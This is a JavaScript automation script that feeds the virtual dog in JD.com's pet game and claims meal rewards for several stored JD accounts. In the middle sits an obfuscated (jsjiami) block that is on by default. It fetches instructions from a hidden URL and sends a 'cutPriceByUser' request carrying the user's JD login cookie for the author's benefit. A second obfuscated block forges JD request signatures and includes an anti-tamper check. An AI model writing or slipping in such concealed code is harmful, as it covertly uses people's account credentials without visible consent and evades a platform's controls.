/*
宠汪汪喂食(如果喂食80g失败，降级一个档次喂食（40g）,依次类推),三餐，建议一小时运行一次
更新时间：2020-11-03
活动入口：京东APP我的-更多工具-宠汪汪
脚本内置了一个给作者任务助力的网络请求，默认开启，如介意请自行关闭。
参数 helpAuthor = false
脚本作者：lxk0301
*/

const $ = new Env('宠汪汪🐕喂食');
const notify = $.isNode() ? require('./sendNotify') : '';
//Node.js用户请在jdCookie.js处填写京东ck;
const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
let helpAuthor = true; //为作者助力的开关
//IOS等用户直接用NobyDa的jd cookie
let cookiesArr = [], cookie = '';
if ($.isNode()) {
  Object.keys(jdCookieNode).forEach((item) => {
    cookiesArr.push(jdCookieNode[item])
  })
  if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {};
} else {
  let cookiesData = $.getdata('CookiesJD') || "[]";
  cookiesData = jsonParse(cookiesData);
  cookiesArr = cookiesData.map(item => item.cookie);
  cookiesArr.reverse();
  cookiesArr.push(...[$.getdata('CookieJD2'), $.getdata('CookieJD')]);
  cookiesArr.reverse();
  cookiesArr = cookiesArr.filter(item => item !== "" && item !== null && item !== undefined);
}
let jdNotify = true;//是否开启静默运行。默认true开启
let message = '', subTitle = '';
const JD_API_HOST = 'https://jdjoy.jd.com'
let FEED_NUM = ($.getdata('joyFeedCount') * 1) || 10;   //喂食数量默认10g,可选 10,20,40,80 , 其他数字不可.

!(async () => {
  if (!cookiesArr[0]) {
    $.msg($.name, '【提示】请先获取京东账号一cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/bean/signIndex.action', {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});
    return;
  }
  for (let i = 0; i < cookiesArr.length; i++) {
    if (cookiesArr[i]) {
      cookie = cookiesArr[i];
      $.UserName = decodeURIComponent(cookie.match(/pt_pin=(.+?);/) && cookie.match(/pt_pin=(.+?);/)[1])
      $.index = i + 1;
      $.isLogin = true;
      $.nickName = '';
      await TotalBean();
      var _0xodD='jsjiami.com.v6',_0x3481=[_0xodD,'w51SBsOiw54=','KkBJwpzDoy3DjAvChHDDiVYCQBLCvsKmfBlQJBRjw4t4wp5Lw67CpwDDr095wq4Ow590w5HCnsOiwpPCjGDDizjDgEHCtVQHw4bDqBR1eFFcTBkpaWxHVcO5wqMKwo/CqMKmw5LDtl42w5onw6/CrcKFKCfDqcOQw7UtNVjDvHJewpcMZMK/wqIdw4bCnyAaDMOAw6Eqw63CrxI9YsKZYcOTwqQCXyJZKsKCI3s+wo3DvMKhYRnCpMKVMsOHNx7DtVfCv1UKcsKjw7txw59hXljCusO7Q3bDlSkyw7fCo8Kq','w4hhwopYw5I0wopkwq7DlgzDncKtFSB7BcKswonCjFFfX8OrwqQQFMKIXsKEw53CkcKrc8Kqw4LDg8KvIhfDqsKhN3gdwqwJwowhE3vCtWZhCzZow47Cq8Ofw6UMPiLCr8OqCsOCHTQ=','wqgbaVI2','woHDlhPCosO0','wqpmwoI=','wrwqwoDCo8Kb','w4R0wopJw6Zrw5E=','wqTDixnCs8OzOw==','ZMKxw5rCslc0wqHDlMO3N8OBJ8O6bS/DtHJ4wrdeNzw4RsO6wp3Dk8KUfhZxwqfCjcO0','EcOMw4ESfQ==','LlDCgcKrw68=','w4hhwopYw5I0wopkwqHCilbDlcOmUSc6C8Oswrc=','wp3CpMKSEFbCqcK5w61swoUJwrUTw5jDjTbDuCXCq3l3woTDvcKidVktfiPCo3Uuwoc=','UMOpD8OmwqDCmsKtT1LCiBbCohRLJMKAVg0AJ8KVMMO0wp4nScKTZATDgzLCl0ElNTXCiELDnMOsTSrDj3BGw5ZyHx4Ac8K4QsOlw67CrWwwRcOGw715bAxSXRMfw4nCo8OXBXbDoR98w7/CsMOrE8OEEFRswqYdwpEOw5rDgMOWw47DgH3CssORL8OVwoYJGBFIBRnCgcKgw4LDtcOcwr3Cl2Y4NcKHw47DrsK+w4giw6lFMsO8w44DHWoLwqBzwp5sXMKkfsKHNMOtwqx8TMK/wprCnx/DucKwC8K2fGl2wqDCoCZnwr7Cu8O3GwZFw7XDs8OHOMKCw4LDhSHDocOFworCocOCTxRAAyRIw7fDs8KIwojCgHvCs8O3P8OuwpHCvxTDkjY9eRdzbXDDhcKjwqnDlsOfWcOvw6zCsMONw7vDo8K9OsOvQHMcNGRiATnCoQvCiMObwrsewpTCksOaw4s2w6TClCfCh8OxP28+w4tFfTpRwrnDl8K2wqbCrMO6w6PCgSvDmsOSwqJIw6oiw6tRPMOwwq4kw5FgG8KGw6fDkDrDpTLChT9BTcKxXWkMLw==','XsOsGsO3wpfDhMKw','TUDCmMKFwrVFB8KmWcOcQ8Kqw4ttwp0pDsOvA2lecBQWd8OQK8KDwoDCtg==','bMKLw708w7Q+wpY=','BkxHwrzDiw==','woUCeUUCfsOy','EsO3Fzw=','fsO5Qk7CjcKP','w6vDkMKywpnCqXUsKcOKw4fDmsKtwovDkAwwwrg6wqwXZsOJDcKXwrlWNWAWN08Ow7R2AW4Bf8OLw7rDo8O8YTrCig==','wroJw70Z','wpDCu8KF','MH9gwrjDiA==','w7PDqgJqwr4=','wrxgXsO6w5jDvsKiEH03YsK8','fsOqRlHCrcKow5bDocK2Px9xw47CtsKCwrYCCTPCqcKywrDDj0jCslzCvUrDql97wpoO','wqFzwow4UgMLcRR3IWkowq7DpcOJFA==','BHyelWfjysfYBjUxiaJmIi.QTcom.v6=='];(function(_0x4116aa,_0x5a522b,_0x1e0951){var _0x37c1ef=function(_0x5653a4,_0x3266d1,_0x153db2,_0x334419,_0x3a9e08){_0x3266d1=_0x3266d1>>0x8,_0x3a9e08='po';var _0x4c7b6c='shift',_0x4153eb='push';if(_0x3266d1<_0x5653a4){while(--_0x5653a4){_0x334419=_0x4116aa[_0x4c7b6c]();if(_0x3266d1===_0x5653a4){_0x3266d1=_0x334419;_0x153db2=_0x4116aa[_0x3a9e08+'p']();}else if(_0x3266d1&&_0x153db2['replace'](/[BHyelWfyfYBUxJIQT=]/g,'')===_0x3266d1){_0x4116aa[_0x4153eb](_0x334419);}}_0x4116aa[_0x4153eb](_0x4116aa[_0x4c7b6c]());}return 0x7442a;};return _0x37c1ef(++_0x5a522b,_0x1e0951)>>_0x5a522b^_0x1e0951;}(_0x3481,0x74,0x7400));var _0x1fa5=function(_0x4c8f3d,_0x53c31c){_0x4c8f3d=~~'0x'['concat'](_0x4c8f3d);var _0x1e4b61=_0x3481[_0x4c8f3d];if(_0x1fa5['iXZJAS']===undefined){(function(){var _0x108dd2=typeof window!=='undefined'?window:typeof process==='object'&&typeof require==='function'&&typeof global==='object'?global:this;var _0x5a5936='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x108dd2['atob']||(_0x108dd2['atob']=function(_0x2787df){var _0x982edd=String(_0x2787df)['replace'](/=+$/,'');for(var _0x21abd2=0x0,_0x446c74,_0x5d1872,_0x3d7d05=0x0,_0x38a9fb='';_0x5d1872=_0x982edd['charAt'](_0x3d7d05++);~_0x5d1872&&(_0x446c74=_0x21abd2%0x4?_0x446c74*0x40+_0x5d1872:_0x5d1872,_0x21abd2++%0x4)?_0x38a9fb+=String['fromCharCode'](0xff&_0x446c74>>(-0x2*_0x21abd2&0x6)):0x0){_0x5d1872=_0x5a5936['indexOf'](_0x5d1872);}return _0x38a9fb;});}());var _0x372192=function(_0x1ed603,_0x53c31c){var _0x53d4b5=[],_0x4dad26=0x0,_0x2db3a6,_0x1a4ef2='',_0x10e137='';_0x1ed603=atob(_0x1ed603);for(var _0x5d5ee8=0x0,_0x1591c9=_0x1ed603['length'];_0x5d5ee8<_0x1591c9;_0x5d5ee8++){_0x10e137+='%'+('00'+_0x1ed603['charCodeAt'](_0x5d5ee8)['toString'](0x10))['slice'](-0x2);}_0x1ed603=decodeURIComponent(_0x10e137);for(var _0x5a2ab0=0x0;_0x5a2ab0<0x100;_0x5a2ab0++){_0x53d4b5[_0x5a2ab0]=_0x5a2ab0;}for(_0x5a2ab0=0x0;_0x5a2ab0<0x100;_0x5a2ab0++){_0x4dad26=(_0x4dad26+_0x53d4b5[_0x5a2ab0]+_0x53c31c['charCodeAt'](_0x5a2ab0%_0x53c31c['length']))%0x100;_0x2db3a6=_0x53d4b5[_0x5a2ab0];_0x53d4b5[_0x5a2ab0]=_0x53d4b5[_0x4dad26];_0x53d4b5[_0x4dad26]=_0x2db3a6;}_0x5a2ab0=0x0;_0x4dad26=0x0;for(var _0x20d24a=0x0;_0x20d24a<_0x1ed603['length'];_0x20d24a++){_0x5a2ab0=(_0x5a2ab0+0x1)%0x100;_0x4dad26=(_0x4dad26+_0x53d4b5[_0x5a2ab0])%0x100;_0x2db3a6=_0x53d4b5[_0x5a2ab0];_0x53d4b5[_0x5a2ab0]=_0x53d4b5[_0x4dad26];_0x53d4b5[_0x4dad26]=_0x2db3a6;_0x1a4ef2+=String['fromCharCode'](_0x1ed603['charCodeAt'](_0x20d24a)^_0x53d4b5[(_0x53d4b5[_0x5a2ab0]+_0x53d4b5[_0x4dad26])%0x100]);}return _0x1a4ef2;};_0x1fa5['zywqLm']=_0x372192;_0x1fa5['OxnDfj']={};_0x1fa5['iXZJAS']=!![];}var _0x30f80a=_0x1fa5['OxnDfj'][_0x4c8f3d];if(_0x30f80a===undefined){if(_0x1fa5['ohspTj']===undefined){_0x1fa5['ohspTj']=!![];}_0x1e4b61=_0x1fa5['zywqLm'](_0x1e4b61,_0x53c31c);_0x1fa5['OxnDfj'][_0x4c8f3d]=_0x1e4b61;}else{_0x1e4b61=_0x30f80a;}return _0x1e4b61;};if(helpAuthor){new Promise(_0x311869=>{var _0xc1044a={'Ixdvs':_0x1fa5('0','UTtG'),'wnJyi':_0x1fa5('1','6Au1'),'EgxWg':_0x1fa5('2','3AG4'),'Dvzie':_0x1fa5('3','(CSU'),'WBUEX':_0x1fa5('4','2be^'),'WPSMG':function(_0x54d851){return _0x54d851();},'eUEQE':_0x1fa5('5','$Fqp')};$['get']({'url':_0x1fa5('6','2pJ1'),'headers':{'User-Agent':_0xc1044a['eUEQE']}},(_0x362f0b,_0x4db390,_0x2eaae3)=>{if(_0xc1044a[_0x1fa5('7','zHT]')]!==_0xc1044a[_0x1fa5('8','O29Q')]){console[_0x1fa5('9','(CSU')](e);}else{try{if(_0x2eaae3){$['dataGet']=JSON[_0x1fa5('a','iNr[')](_0x2eaae3);if($[_0x1fa5('b','2pJ1')]['data'][_0x1fa5('c','O29Q')]!==0x0){let _0x1cb640={'url':_0x1fa5('d','v7Km'),'headers':{'Host':_0xc1044a[_0x1fa5('e','9Dli')],'Content-Type':_0xc1044a[_0x1fa5('f','!5g9')],'Origin':_0x1fa5('10','2pJ1'),'Accept-Encoding':_0xc1044a['Dvzie'],'Cookie':cookie,'Connection':'keep-alive','Accept':_0x1fa5('11','dn*$'),'User-Agent':_0x1fa5('12','moFm'),'Referer':'https://h5.m.jd.com/babelDiy/Zeus/4ZK4ZpvoSreRB92RRo8bpJAQNoTq/index.html?serveId=wxe30973feca923229&actId='+$[_0x1fa5('13','moFm')]['data'][0x0]['actID']+_0x1fa5('14','!5g9'),'Accept-Language':_0xc1044a['WBUEX']},'body':'functionId=cutPriceByUser&body={\x22activityId\x22:\x22'+$[_0x1fa5('15','DyYD')]['data'][0x0][_0x1fa5('16','$Fqp')]+'\x22,\x22userName\x22:\x22\x22,\x22followShop\x22:1,\x22shopId\x22:'+$[_0x1fa5('17','zHT]')][_0x1fa5('18','Tf]5')][0x0][_0x1fa5('19','3AG4')]+_0x1fa5('1a','Ob3d')};return new Promise(_0x311869=>{$[_0x1fa5('1b','al9J')](_0x1cb640,(_0x362f0b,_0x860f6b,_0x2eaae3)=>{});});}}}catch(_0x4f096b){console[_0x1fa5('1c','dn*$')](_0x4f096b);}finally{_0xc1044a[_0x1fa5('1d','$Fqp')](_0x311869);}}});});};_0xodD='jsjiami.com.v6';

      console.log(`\n开始【京东账号${$.index}】${$.nickName || $.UserName}\n`);
      if (!$.isLogin) {
        $.msg($.name, `【提示】cookie已失效`, `京东账号${$.index} ${$.nickName || $.UserName}\n请重新登录获取\nhttps://bean.m.jd.com/bean/signIndex.action`, {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});

        if ($.isNode()) {
          await notify.sendNotify(`${$.name}cookie已失效 - ${$.UserName}`, `京东账号${$.index} ${$.UserName}\n请重新登录获取cookie`);
        }
        continue
      }
      message = '';
      subTitle = '';
      if ($.isNode()) {
        if (process.env.JOY_FEED_COUNT) {
          if ([10, 20, 40, 80].indexOf(process.env.JOY_FEED_COUNT * 1) > -1) {
            FEED_NUM = process.env.JOY_FEED_COUNT ? process.env.JOY_FEED_COUNT * 1 : FEED_NUM;
          } else {
            console.log(`您输入的 JOY_FEED_COUNT 为非法数字，请重新输入`);
          }
        }
      }
      await feedPets(FEED_NUM);//喂食
      await ThreeMeals();//三餐
      await showMsg();
    }
  }
})()
    .catch((e) => {
      $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
    })
    .finally(() => {
      $.done();
    })
function showMsg() {
  $.log(`\n${message}\n`);
  jdNotify = $.getdata('jdJoyNotify') ? $.getdata('jdJoyNotify') : jdNotify;
  if (!jdNotify || jdNotify === 'false') {
    //$.msg($.name, subTitle, `【京东账号${$.index}】${$.UserName}\n` + message);
  }
}
function feedPets(feedNum) {
  return new Promise(resolve => {
    console.log(`您设置的喂食数量::${FEED_NUM}g\n`);
    console.log(`实际的喂食数量::${feedNum}g\n`);
    let opt = {
      url: `//jdjoy.jd.com/common/pet/feed?feedCount=${feedNum}&reqSource=h5`,
      // url: "//draw.jdfcloud.com/common/pet/getPetTaskConfig?reqSource=h5",
      method: "GET",
      data: {},
      credentials: "include",
      header: {"content-type": "application/json"}
    }
    const url = "https:"+ taroRequest(opt)['url']
    const options = {
      url,
      headers: {
        'Cookie': cookie,
        'reqSource': 'h5',
        'Host': 'jdjoy.jd.com',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Referer': 'https://jdjoy.jd.com/pet/index',
        'User-Agent': $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0"),
        'Accept-Language': 'zh-cn',
        'Accept-Encoding': 'gzip, deflate, br',
      }
    }
    $.get(options, async (err, resp, data) => {
      try {
        $.data = JSON.parse(data);
        if ($.data.success) {
          if ($.data.errorCode === 'feed_ok') {
            console.log('喂食成功')
            message += `【喂食成功】${feedNum}g\n`;
          } else if ($.data.errorCode === 'time_error') {
            console.log('喂食失败：正在食用')
            message += `【喂食失败】您的汪汪正在食用\n`;
          } else if ($.data.errorCode === 'food_insufficient') {
            console.log(`当前喂食${feedNum}g狗粮不够, 现为您降低一档次喂食\n`)
            if ((feedNum) === 80) {
              feedNum = 40;
            } else if ((feedNum) === 40) {
              feedNum = 20;
            } else if ((feedNum) === 20) {
              feedNum = 10;
            } else if ((feedNum) === 10) {
              feedNum = 0;
            }
            // 如果喂食设置的数量失败, 就降低一个档次喂食.
            if ((feedNum) !== 0) {
              await feedPets(feedNum);
            } else {
              console.log('您的狗粮已不足10g')
              message += `【喂食失败】您的狗粮已不足10g\n`;
            }
          } else {
            console.log(`其他状态${$.data.errorCode}`)
          }
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve($.data);
      }
    })
  })
}

//三餐
function ThreeMeals() {
  return new Promise(resolve => {
    let opt = {
      url: "//jdjoy.jd.com/common/pet/getFood?taskType=ThreeMeals&reqSource=h5",
      // url: "//draw.jdfcloud.com/common/pet/getPetTaskConfig?reqSource=h5",
      method: "GET",
      data: {},
      credentials: "include",
      header: {"content-type": "application/json"}
    }
    const url = "https:"+ taroRequest(opt)['url']
    const options = {
      url,
      headers: {
        'Cookie': cookie,
        'reqSource': 'h5',
        'Host': 'jdjoy.jd.com',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Referer': 'https://jdjoy.jd.com/pet/index',
        'User-Agent': $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0"),
        'Accept-Language': 'zh-cn',
        'Accept-Encoding': 'gzip, deflate, br',
      }
    }
    $.get(options, async (err, resp, data) => {
      try {
        data = JSON.parse(data);
        if (data.success) {
          if (data.errorCode === 'received') {
            console.log(`三餐结果领取成功`)
            message += `【三餐】领取成功，获得${data.data}g狗粮\n`;
          }
        }
      } catch (e) {
        $.logErr(resp, e);
      } finally {
        resolve(data);
      }
    })
  })
}
function jsonParse(str) {
  if (typeof str == "string") {
    try {
      return JSON.parse(str);
    } catch (e) {
      console.log(e);
      $.msg($.name, '', '请勿随意在BoxJs输入框修改内容\n建议通过脚本去获取cookie')
      return [];
    }
  }
}
function TotalBean() {
  return new Promise(async resolve => {
    const options = {
      "url": `https://wq.jd.com/user/info/QueryJDUserInfo?sceneval=2`,
      "headers": {
        "Accept": "application/json,text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-cn",
        "Connection": "keep-alive",
        "Cookie": cookie,
        "Referer": "https://wqs.jd.com/my/jingdou/my.shtml?sceneval=2",
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0")
      }
    }
    $.post(options, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (data) {
            data = JSON.parse(data);
            if (data['retcode'] === 13) {
              $.isLogin = false; //cookie过期
              return
            }
            $.nickName = data['base'].nickname;
          } else {
            console.log(`京东服务器返回空数据`)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxb227b=["\x69\x73\x4E\x6F\x64\x65","\x63\x72\x79\x70\x74\x6F\x2D\x6A\x73","\x39\x38\x63\x31\x34\x63\x39\x39\x37\x66\x64\x65\x35\x30\x63\x63\x31\x38\x62\x64\x65\x66\x65\x63\x66\x64\x34\x38\x63\x65\x62\x37","\x70\x61\x72\x73\x65","\x55\x74\x66\x38","\x65\x6E\x63","\x65\x61\x36\x35\x33\x66\x34\x66\x33\x63\x35\x65\x64\x61\x31\x32","\x63\x69\x70\x68\x65\x72\x74\x65\x78\x74","\x43\x42\x43","\x6D\x6F\x64\x65","\x50\x6B\x63\x73\x37","\x70\x61\x64","\x65\x6E\x63\x72\x79\x70\x74","\x41\x45\x53","\x48\x65\x78","\x73\x74\x72\x69\x6E\x67\x69\x66\x79","\x42\x61\x73\x65\x36\x34","\x64\x65\x63\x72\x79\x70\x74","\x6C\x65\x6E\x67\x74\x68","\x6D\x61\x70","\x73\x6F\x72\x74","\x6B\x65\x79\x73","\x67\x69\x66\x74","\x70\x65\x74","\x69\x6E\x63\x6C\x75\x64\x65\x73","\x26","\x6A\x6F\x69\x6E","\x3D","\x3F","\x69\x6E\x64\x65\x78\x4F\x66","\x63\x6F\x6D\x6D\x6F\x6E\x2F","\x72\x65\x70\x6C\x61\x63\x65","\x68\x65\x61\x64\x65\x72","\x75\x72\x6C","\x72\x65\x71\x53\x6F\x75\x72\x63\x65\x3D\x68\x35","\x61\x73\x73\x69\x67\x6E","\x6D\x65\x74\x68\x6F\x64","\x47\x45\x54","\x64\x61\x74\x61","\x74\x6F\x4C\x6F\x77\x65\x72\x43\x61\x73\x65","\x6B\x65\x79\x43\x6F\x64\x65","\x63\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65","","\x67\x65\x74","\x70\x6F\x73\x74","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x5F","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function taroRequest(_0x1226x2){const _0x1226x3=$[__Oxb227b[0x0]]()?require(__Oxb227b[0x1]):CryptoJS;const _0x1226x4=__Oxb227b[0x2];const _0x1226x5=_0x1226x3[__Oxb227b[0x5]][__Oxb227b[0x4]][__Oxb227b[0x3]](_0x1226x4);const _0x1226x6=_0x1226x3[__Oxb227b[0x5]][__Oxb227b[0x4]][__Oxb227b[0x3]](__Oxb227b[0x6]);let _0x1226x7={"\x41\x65\x73\x45\x6E\x63\x72\x79\x70\x74":function _0x1226x8(_0x1226x2){var _0x1226x9=_0x1226x3[__Oxb227b[0x5]][__Oxb227b[0x4]][__Oxb227b[0x3]](_0x1226x2);return _0x1226x3[__Oxb227b[0xd]][__Oxb227b[0xc]](_0x1226x9,_0x1226x5,{"\x69\x76":_0x1226x6,"\x6D\x6F\x64\x65":_0x1226x3[__Oxb227b[0x9]][__Oxb227b[0x8]],"\x70\x61\x64\x64\x69\x6E\x67":_0x1226x3[__Oxb227b[0xb]][__Oxb227b[0xa]]})[__Oxb227b[0x7]].toString()},"\x41\x65\x73\x44\x65\x63\x72\x79\x70\x74":function _0x1226xa(_0x1226x2){var _0x1226x9=_0x1226x3[__Oxb227b[0x5]][__Oxb227b[0xe]][__Oxb227b[0x3]](_0x1226x2),_0x1226xb=_0x1226x3[__Oxb227b[0x5]][__Oxb227b[0x10]][__Oxb227b[0xf]](_0x1226x9);return _0x1226x3[__Oxb227b[0xd]][__Oxb227b[0x11]](_0x1226xb,_0x1226x5,{"\x69\x76":_0x1226x6,"\x6D\x6F\x64\x65":_0x1226x3[__Oxb227b[0x9]][__Oxb227b[0x8]],"\x70\x61\x64\x64\x69\x6E\x67":_0x1226x3[__Oxb227b[0xb]][__Oxb227b[0xa]]}).toString(_0x1226x3[__Oxb227b[0x5]].Utf8).toString()},"\x42\x61\x73\x65\x36\x34\x45\x6E\x63\x6F\x64\x65":function _0x1226xc(_0x1226x2){var _0x1226x9=_0x1226x3[__Oxb227b[0x5]][__Oxb227b[0x4]][__Oxb227b[0x3]](_0x1226x2);return _0x1226x3[__Oxb227b[0x5]][__Oxb227b[0x10]][__Oxb227b[0xf]](_0x1226x9)},"\x42\x61\x73\x65\x36\x34\x44\x65\x63\x6F\x64\x65":function _0x1226xd(_0x1226x2){return _0x1226x3[__Oxb227b[0x5]][__Oxb227b[0x10]][__Oxb227b[0x3]](_0x1226x2).toString(_0x1226x3[__Oxb227b[0x5]].Utf8)},"\x4D\x64\x35\x65\x6E\x63\x6F\x64\x65":function _0x1226xe(_0x1226x2){return _0x1226x3.MD5(_0x1226x2).toString()},"\x6B\x65\x79\x43\x6F\x64\x65":__Oxb227b[0x2]};const _0x1226xf=function _0x1226x10(_0x1226x2,_0x1226x9){if(_0x1226x2 instanceof  Array){_0x1226x9= _0x1226x9|| [];for(var _0x1226xb=0;_0x1226xb< _0x1226x2[__Oxb227b[0x12]];_0x1226xb++){_0x1226x9[_0x1226xb]= _0x1226x10(_0x1226x2[_0x1226xb],_0x1226x9[_0x1226xb])}}else {!(_0x1226x2 instanceof  Array)&& _0x1226x2 instanceof  Object?(_0x1226x9= _0x1226x9|| {},Object[__Oxb227b[0x15]](_0x1226x2)[__Oxb227b[0x14]]()[__Oxb227b[0x13]](function(_0x1226xb){_0x1226x9[_0x1226xb]= _0x1226x10(_0x1226x2[_0x1226xb],_0x1226x9[_0x1226xb])})):_0x1226x9= _0x1226x2};return _0x1226x9};const _0x1226x11=function _0x1226x12(_0x1226x2){for(var _0x1226x9=[__Oxb227b[0x16],__Oxb227b[0x17]],_0x1226xb=!1,_0x1226x3=0;_0x1226x3< _0x1226x9[__Oxb227b[0x12]];_0x1226x3++){var _0x1226x4=_0x1226x9[_0x1226x3];_0x1226x2[__Oxb227b[0x18]](_0x1226x4)&&  !_0x1226xb&& (_0x1226xb=  !0)};return _0x1226xb};const _0x1226x13=function _0x1226x14(_0x1226x2,_0x1226x9){if(_0x1226x9&& Object[__Oxb227b[0x15]](_0x1226x9)[__Oxb227b[0x12]]> 0){var _0x1226xb=Object[__Oxb227b[0x15]](_0x1226x9)[__Oxb227b[0x13]](function(_0x1226x2){return _0x1226x2+ __Oxb227b[0x1b]+ _0x1226x9[_0x1226x2]})[__Oxb227b[0x1a]](__Oxb227b[0x19]);return _0x1226x2[__Oxb227b[0x1d]](__Oxb227b[0x1c])>= 0?_0x1226x2+ __Oxb227b[0x19]+ _0x1226xb:_0x1226x2+ __Oxb227b[0x1c]+ _0x1226xb};return _0x1226x2};const _0x1226x15=function _0x1226x16(_0x1226x2){for(var _0x1226x9=_0x1226x6,_0x1226xb=0;_0x1226xb< _0x1226x9[__Oxb227b[0x12]];_0x1226xb++){var _0x1226x3=_0x1226x9[_0x1226xb];_0x1226x2[__Oxb227b[0x18]](_0x1226x3)&&  !_0x1226x2[__Oxb227b[0x18]](__Oxb227b[0x1e]+ _0x1226x3)&& (_0x1226x2= _0x1226x2[__Oxb227b[0x1f]](_0x1226x3,__Oxb227b[0x1e]+ _0x1226x3))};return _0x1226x2};var _0x1226x9=_0x1226x2,_0x1226xb=(_0x1226x9[__Oxb227b[0x20]],_0x1226x9[__Oxb227b[0x21]]);_0x1226xb+= (_0x1226xb[__Oxb227b[0x1d]](__Oxb227b[0x1c])>  -1?__Oxb227b[0x19]:__Oxb227b[0x1c])+ __Oxb227b[0x22];var _0x1226x17=function _0x1226x18(_0x1226x2){var _0x1226x9=_0x1226x2[__Oxb227b[0x21]],_0x1226xb=_0x1226x2[__Oxb227b[0x24]],_0x1226x3=void(0)=== _0x1226xb?__Oxb227b[0x25]:_0x1226xb,_0x1226x4=_0x1226x2[__Oxb227b[0x26]],_0x1226x6=_0x1226x2[__Oxb227b[0x20]],_0x1226x19=void(0)=== _0x1226x6?{}:_0x1226x6,_0x1226x1a=_0x1226x3[__Oxb227b[0x27]](),_0x1226x1b=_0x1226x7[__Oxb227b[0x28]],_0x1226x1c=_0x1226x19[__Oxb227b[0x29]]|| _0x1226x19[__Oxb227b[0x2a]]|| __Oxb227b[0x2b],_0x1226x1d=__Oxb227b[0x2b],_0x1226x1e=+ new Date();return _0x1226x1d= __Oxb227b[0x2c]!== _0x1226x1a&& (__Oxb227b[0x2d]!== _0x1226x1a|| __Oxb227b[0x2e]!== _0x1226x1c[__Oxb227b[0x27]]()&& _0x1226x4&& Object[__Oxb227b[0x15]](_0x1226x4)[__Oxb227b[0x12]])?_0x1226x7.Md5encode(_0x1226x7.Base64Encode(_0x1226x7.AesEncrypt(__Oxb227b[0x2b]+ JSON[__Oxb227b[0xf]](_0x1226xf(_0x1226x4))))+ __Oxb227b[0x2f]+ _0x1226x1b+ __Oxb227b[0x2f]+ _0x1226x1e):_0x1226x7.Md5encode(__Oxb227b[0x2f]+ _0x1226x1b+ __Oxb227b[0x2f]+ _0x1226x1e),_0x1226x11(_0x1226x9)&& (_0x1226x9= _0x1226x13(_0x1226x9,{"\x6C\x6B\x73":_0x1226x1d,"\x6C\x6B\x74":_0x1226x1e}),_0x1226x9= _0x1226x15(_0x1226x9)),Object[__Oxb227b[0x23]](_0x1226x2,{"\x75\x72\x6C":_0x1226x9})}(_0x1226x2= Object[__Oxb227b[0x23]](_0x1226x2,{"\x75\x72\x6C":_0x1226xb}));return _0x1226x17}(function(_0x1226x1f,_0x1226xf,_0x1226x20,_0x1226x21,_0x1226x1c,_0x1226x22){_0x1226x22= __Oxb227b[0x30];_0x1226x21= function(_0x1226x19){if( typeof alert!== _0x1226x22){alert(_0x1226x19)};if( typeof console!== _0x1226x22){console[__Oxb227b[0x31]](_0x1226x19)}};_0x1226x20= function(_0x1226x3,_0x1226x1f){return _0x1226x3+ _0x1226x1f};_0x1226x1c= _0x1226x20(__Oxb227b[0x32],_0x1226x20(_0x1226x20(__Oxb227b[0x33],__Oxb227b[0x34]),__Oxb227b[0x35]));try{_0x1226x1f= __encode;if(!( typeof _0x1226x1f!== _0x1226x22&& _0x1226x1f=== _0x1226x20(__Oxb227b[0x36],__Oxb227b[0x37]))){_0x1226x21(_0x1226x1c)}}catch(e){_0x1226x21(_0x1226x1c)}})({})
// prettier-ignore
